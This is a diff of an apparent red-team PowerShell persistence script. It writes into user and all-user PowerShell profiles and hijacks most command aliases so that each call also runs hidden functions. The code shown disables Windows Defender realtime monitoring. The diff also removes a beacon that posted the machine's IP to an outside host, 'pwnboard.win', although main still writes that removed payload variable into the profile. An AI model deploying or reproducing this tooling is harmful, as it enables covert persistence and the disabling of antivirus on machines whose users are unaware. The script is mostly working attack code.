@@ -1,6 +1,3 @@
-$mm = @'
-function mm {try {$i=(Test-Connection -ComputerName $env:ComputerName -Count 1).IPV4Address.IPAddressToString;$p=@{"ip"=$i;"type"="Alias_Shim"}|ConvertTo-Json;Invoke-WebRequest "http://pwnboard.win/generic"  -ErrorAction SilentlyContinue -TimeOutSec 2 -Method Post -UseBasicParsing -Body $p -ContentType "application/json" | Out-Null}Catch{$_}}
-'@.Trim()
 $dd = @'
 function dd {Start-Job -ScriptBlock {try{Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue }Catch{$_}} | Out-Null }
 '@.Trim()
@@ -14,8 +11,9 @@ function xx {try{$x=$false;Get-Content "C:\Windows\System32\drivers\etc\hosts" -
 $orig_dct = @{ }
 function cool() {
     param([parameter(ValueFromPipeline)][string]$cmd)
-    if ($cmd -match "gin" -or $cmd -match "scb" -or $cmd -match "%" -or $cmd -match "stz" -or $cmd -match "gtz" -or $cmd -match "write" -or $cmd -match "where" -or $cmd -match "foreach") {
-        # These can break things so will skip
+    if ($cmd -match "\?" -or $cmd -match "cd" -or $cmd -match "gcb" -or $cmd -match "gin" -or $cmd -match "scb" -or $cmd -match "%" -or $cmd -match "stz" -or $cmd -match "gtz" -or $cmd -match "write" -or $cmd -match "where" -or $cmd -match "foreach") {
+        # Shimming these alias can break normal commands so skipping these.s
+        #Write-Host "Skipped $cmd"
         return;
     }
     $value = (Get-Alias -Name $cmd).Definition
@@ -23,9 +21,10 @@ function cool() {
 }
 
 function shim([string]$key, [string]$value) {
-    $y = "function shimmed_$key {$value; Invoke-Expression(`"xx;dd;ff;mm`")}"
+    $y = "function shimmed_$key {$value; xx;dd;ff}"
     $tmp = "shimmed_$key"
-    $shim = 'Set-Alias -Name cmd -Value val -Option AllScope,Constant -Scope Global' + ' -ErrorAction SilentlyContinue -Force'
+    $shim = 'Set-Alias -Name cmd -Value val -Option AllScope -Scope Global' + ' -ErrorAction SilentlyContinue -Force'
+    # Add Constant back
     $s = $shim.Replace("cmd", $key).Replace("val", $tmp)
     $arr = @()
     $arr += $y
@@ -47,7 +46,7 @@ function main() {
     #$env:USERNAME may be modified
     $curuser_allhosts = $PROFILE.CurrentUserAllHosts
     $allusers_allhosts = $PROFILE.AllUsersAllHosts
-    
+
     Try {
         if (!(Test-Path -Path $curuser_allhosts)) {
 
@@ -64,10 +63,8 @@ function main() {
 
     }
     Catch { }
-    
+
     Get-Alias | ForEach-Object { $_.Name | cool }
-    $orig_dct["?"] = "Where-Object"
-    # Only hardcoded because returns 4 different values when doing Get-Alias
     $lst = $orig_dct.Keys | Sort-Object
     $all = @()
     foreach ($key in $lst) {
@@ -78,6 +75,7 @@ function main() {
         $all += $alias_line
         $all += $func_shim
     }
+
     try {
         write_to $curuser_allhosts $mm
         write_to $curuser_allhosts $gg
